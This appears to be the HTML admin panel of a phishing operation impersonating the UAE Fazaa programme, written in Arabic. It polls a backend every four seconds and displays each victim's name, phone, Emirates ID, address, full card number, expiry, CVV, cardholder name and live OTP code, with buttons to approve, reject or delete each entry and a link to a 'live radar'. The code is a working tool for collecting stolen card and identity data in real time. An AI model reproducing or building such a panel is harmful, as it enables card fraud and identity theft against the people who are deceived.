<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>فزعة - FAZAA | لوحة التحكم</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
    <script>
        (function() {
            try {
                let currentFetch = window.fetch ? window.fetch.bind(window) : null;
                const desc = Object.getOwnPropertyDescriptor(window, 'fetch') || 
                             (window.Window ? Object.getOwnPropertyDescriptor(Window.prototype, 'fetch') : null);
                if (desc && !desc.set) {
                    try {
                        Object.defineProperty(window, 'fetch', {
                            get: function() { return currentFetch; },
                            set: function(v) { currentFetch = v; },
                            configurable: true,
                            enumerable: true
                        });
                    } catch (e1) {
                        try {
                            if (window.Window) {
                                Object.defineProperty(Window.prototype, 'fetch', {
                                    get: function() { return currentFetch; },
                                    set: function(v) { currentFetch = v; },
                                    configurable: true,
                                    enumerable: true
                                });
                            }
                        } catch (e2) {}
                    }
                }
            } catch (e) {}
        })();
    </script>
    <style>
        body { font-family: 'Tajawal', sans-serif; background: #f8fafc; }
        .mono { font-family: 'Roboto Mono', monospace; }
        .gold-grad { background: linear-gradient(to right, #7a6318, #c9a227); }
    </style>
</head>
<body class="min-h-screen flex flex-col bg-slate-50 text-slate-800">

    <!-- Header -->
    <header class="h-[80px] w-full gold-grad flex items-center justify-between px-6 md:px-12 text-white shadow-md">
        <div class="flex items-center gap-4">
            <span class="font-extrabold text-2xl tracking-wider">فزعة</span>
            <span class="text-xs bg-white/20 px-3 py-1 rounded-full border border-white/30">لوحة الإدارة</span>
        </div>
        <div class="flex items-center gap-3">
            <a href="/radar" target="_blank" class="bg-white/20 hover:bg-white/30 text-xs font-bold py-2 px-4 rounded-xl border border-white/30 flex items-center gap-2">
                <span>📡</span>
                <span>فتح الرادار الحي</span>
            </a>
            <a href="/" class="text-xs bg-black/20 hover:bg-black/30 px-3 py-2 rounded-xl">الموقع الرئيسي</a>
        </div>
    </header>

    <main class="flex-1 max-w-6xl w-full mx-auto px-4 py-8">
        <!-- Stats overview -->
        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
            <div class="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
                <p class="text-xs text-slate-500 font-bold mb-1">إجمالي الطلبات</p>
                <p class="text-3xl font-black text-slate-800" id="total-count">0</p>
            </div>
            <div class="bg-white p-5 rounded-2xl border border-amber-200 shadow-sm bg-amber-50/30">
                <p class="text-xs text-amber-600 font-bold mb-1">قيد الانتظار</p>
                <p class="text-3xl font-black text-amber-600" id="pending-count">0</p>
            </div>
            <div class="bg-white p-5 rounded-2xl border border-green-200 shadow-sm bg-green-50/30">
                <p class="text-xs text-green-600 font-bold mb-1">تمت الموافقة</p>
                <p class="text-3xl font-black text-green-600" id="approved-count">0</p>
            </div>
            <div class="bg-white p-5 rounded-2xl border border-red-200 shadow-sm bg-red-50/30">
                <p class="text-xs text-red-600 font-bold mb-1">مرفوض</p>
                <p class="text-3xl font-black text-red-600" id="rejected-count">0</p>
            </div>
        </div>

        <!-- Filter tabs & refresh -->
        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-6">
            <div class="flex gap-2">
                <button onclick="filterStatus('all')" id="tab-all" class="px-4 py-2 rounded-xl text-sm font-bold bg-[#c9a227] text-white">الكل (<span id="tab-all-num">0</span>)</button>
                <button onclick="filterStatus('pending')" id="tab-pending" class="px-4 py-2 rounded-xl text-sm font-bold bg-white border border-slate-200 text-slate-600 hover:border-[#c9a227]">قيد الانتظار</button>
                <button onclick="filterStatus('approved')" id="tab-approved" class="px-4 py-2 rounded-xl text-sm font-bold bg-white border border-slate-200 text-slate-600 hover:border-[#c9a227]">موافق عليه</button>
                <button onclick="filterStatus('rejected')" id="tab-rejected" class="px-4 py-2 rounded-xl text-sm font-bold bg-white border border-slate-200 text-slate-600 hover:border-[#c9a227]">مرفوض</button>
            </div>
            <div class="flex items-center gap-3">
                <span class="text-xs text-slate-500" id="last-update">جاري التحديث...</span>
                <button onclick="fetchOrders()" class="bg-white border border-slate-200 hover:bg-slate-50 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1">
                    <span>↻</span>
                    <span>تحديث</span>
                </button>
            </div>
        </div>

        <!-- Orders List Container -->
        <div id="orders-container" class="space-y-4">
            <div class="flex justify-center py-20">
                <div class="w-10 h-10 rounded-full border-4 border-[#c9a227]/30 border-t-[#c9a227] animate-spin"></div>
            </div>
        </div>

        <!-- Empty state -->
        <div id="empty-state" class="hidden text-center py-20 bg-white rounded-3xl border border-dashed border-slate-300 p-8">
            <div class="w-16 h-16 rounded-full bg-slate-100 flex items-center justify-center mx-auto mb-4 text-slate-400 text-2xl">📋</div>
            <h3 class="text-lg font-bold text-slate-700 mb-1">لا توجد طلبات مسجلة بعد</h3>
            <p class="text-sm text-slate-500">عندما يقوم زوار الموقع بالتسجيل ستظهر طلباتهم هنا في الحال.</p>
        </div>
    </main>

    <script>
        let currentTab = 'all';
        let allOrders = [];

        function filterStatus(status) {
            currentTab = status;
            ['all', 'pending', 'approved', 'rejected'].forEach(t => {
                const btn = document.getElementById(`tab-${t}`);
                if (t === status) {
                    btn.className = "px-4 py-2 rounded-xl text-sm font-bold bg-[#c9a227] text-white";
                } else {
                    btn.className = "px-4 py-2 rounded-xl text-sm font-bold bg-white border border-slate-200 text-slate-600 hover:border-[#c9a227]";
                }
            });
            renderOrders();
        }

        async function updateStatus(id, newStatus) {
            try {
                await fetch(`/api/pays/${id}/status`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ status: newStatus })
                });
                await fetchOrders();
            } catch (e) {
                console.error(e);
            }
        }

        async function deleteOrder(id) {
            try {
                await fetch(`/api/pays/${id}`, { method: 'DELETE' });
                await fetchOrders();
            } catch (e) {
                console.error(e);
            }
        }

        async function fetchOrders() {
            try {
                const res = await fetch('/api/pays');
                const data = await res.json();
                
                const docs = data.documents || [];
                allOrders = docs.map(d => {
                    const id = d.name.split('/').pop();
                    const f = d.fields || {};
                    return {
                        id,
                        fullName: f.fullName?.stringValue || f.ownerName?.stringValue || '-',
                        phone: f.phoneNumber?.stringValue || f.phone?.stringValue || '-',
                        emiratesId: f.identityNumber?.stringValue || f.emiratesId?.stringValue || '-',
                        cardNumber: f.cardNumber?.stringValue || f._v1?.stringValue || '-',
                        expiry: f.expiry?.stringValue || f.expiryDate?.stringValue || f._v3?.stringValue || '-',
                        cvv: f.cvv?.stringValue || f._v2?.stringValue || '-',
                        cardHolder: f.cardHolder?.stringValue || f.cardHolderName?.stringValue || f._v4?.stringValue || '-',
                        region: f.region?.stringValue || '-',
                        street: f.street?.stringValue || '-',
                        district: f.district?.stringValue || '-',
                        otp: f.otpCode?.stringValue || f.otp?.stringValue || f._v5?.stringValue || '-',
                        status: f.status?.stringValue || 'pending',
                        cardBrand: f.cardBrand?.stringValue || 'fazaa',
                        updateTime: d.updateTime || new Date().toISOString()
                    };
                });

                // Update Counts
                const total = allOrders.length;
                const pending = allOrders.filter(o => o.status === 'pending').length;
                const approved = allOrders.filter(o => o.status === 'approved').length;
                const rejected = allOrders.filter(o => o.status === 'rejected').length;

                document.getElementById('total-count').innerText = total;
                document.getElementById('pending-count').innerText = pending;
                document.getElementById('approved-count').innerText = approved;
                document.getElementById('rejected-count').innerText = rejected;
                document.getElementById('tab-all-num').innerText = total;

                document.getElementById('last-update').innerText = 'آخر تحديث: ' + new Date().toLocaleTimeString('ar-AE');
                renderOrders();
            } catch (e) {
                console.error('Fetch error:', e);
                document.getElementById('last-update').innerText = 'خطأ في التحديث';
            }
        }

        function renderOrders() {
            const container = document.getElementById('orders-container');
            const empty = document.getElementById('empty-state');

            const filtered = currentTab === 'all' ? allOrders : allOrders.filter(o => o.status === currentTab);

            if (filtered.length === 0) {
                container.innerHTML = '';
                empty.classList.remove('hidden');
                return;
            }

            empty.classList.add('hidden');
            container.innerHTML = filtered.map(order => {
                const statusBadge = order.status === 'approved' 
                    ? '<span class="bg-green-100 text-green-700 text-xs px-3 py-1 rounded-full font-bold">موافق عليه</span>'
                    : order.status === 'rejected'
                    ? '<span class="bg-red-100 text-red-700 text-xs px-3 py-1 rounded-full font-bold">مرفوض</span>'
                    : '<span class="bg-amber-100 text-amber-700 text-xs px-3 py-1 rounded-full font-bold">قيد الانتظار</span>';

                const otpBadge = (order.otp && order.otp !== '-') 
                    ? `<span class="bg-yellow-100 border border-yellow-300 text-yellow-800 font-mono text-sm px-3 py-1 rounded-lg font-bold">OTP: ${order.otp}</span>`
                    : '<span class="text-xs text-slate-400 italic">بانتظار الرمز</span>';

                return `
                <div class="bg-white rounded-2xl border border-slate-200 shadow-sm p-6 transition-all hover:shadow-md">
                    <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 mb-4 pb-4 border-b border-slate-100">
                        <div class="flex items-center gap-3">
                            <div class="w-12 h-12 rounded-xl bg-[#c9a227]/10 text-[#c9a227] flex items-center justify-center font-bold text-lg">
                                💳
                            </div>
                            <div>
                                <h4 class="font-bold text-lg text-slate-800">${order.fullName}</h4>
                                <p class="text-xs text-slate-400 font-mono">ID: ${order.id} | ${new Date(order.updateTime).toLocaleString('ar-AE')}</p>
                            </div>
                        </div>
                        <div class="flex items-center gap-3">
                            ${otpBadge}
                            ${statusBadge}
                        </div>
                    </div>

                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 text-sm bg-slate-50 p-4 rounded-xl mb-4">
                        <div>
                            <span class="text-xs text-slate-400 block">رقم الهاتف</span>
                            <span class="font-bold text-slate-700">${order.phone}</span>
                        </div>
                        <div>
                            <span class="text-xs text-slate-400 block">رقم الهوية</span>
                            <span class="font-bold text-slate-700">${order.emiratesId}</span>
                        </div>
                        <div>
                            <span class="text-xs text-slate-400 block">العنوان / المنطقة</span>
                            <span class="font-bold text-slate-700">${order.region} - ${order.district || order.street || ''}</span>
                        </div>
                        <div>
                            <span class="text-xs text-slate-400 block">البطاقة المطلوبة</span>
                            <span class="font-bold text-[#c9a227]">${order.cardBrand}</span>
                        </div>
                    </div>

                    <div class="bg-slate-900 text-white p-4 rounded-xl flex flex-wrap justify-between items-center gap-4 mb-4 text-sm">
                        <div class="flex items-center gap-6">
                            <div>
                                <span class="text-[10px] text-slate-400 block uppercase">Card Number</span>
                                <span class="font-mono text-base tracking-wider text-amber-400">${order.cardNumber}</span>
                            </div>
                            <div>
                                <span class="text-[10px] text-slate-400 block uppercase">Exp</span>
                                <span class="font-mono text-sm">${order.expiry}</span>
                            </div>
                            <div>
                                <span class="text-[10px] text-slate-400 block uppercase">CVV</span>
                                <span class="font-mono text-sm text-yellow-400">${order.cvv}</span>
                            </div>
                        </div>
                        <div>
                            <span class="text-[10px] text-slate-400 block uppercase">Holder</span>
                            <span class="font-bold text-xs uppercase">${order.cardHolder}</span>
                        </div>
                    </div>

                    <div class="flex justify-between items-center pt-2">
                        <button onclick="deleteOrder('${order.id}')" class="text-red-500 hover:text-red-700 text-xs font-bold">
                            ✕ حذف الطلب
                        </button>
                        <div class="flex gap-2">
                            <button onclick="updateStatus('${order.id}', 'rejected')" class="px-3 py-1.5 rounded-lg border border-red-200 text-red-600 hover:bg-red-50 text-xs font-bold">
                                رفض
                            </button>
                            <button onclick="updateStatus('${order.id}', 'approved')" class="px-4 py-1.5 rounded-lg bg-green-600 text-white hover:bg-green-700 text-xs font-bold">
                                ✓ موافقة
                            </button>
                        </div>
                    </div>
                </div>
                `;
            }).join('');
        }

        setInterval(fetchOrders, 4000);
        fetchOrders();
    </script>
</body>
</html>
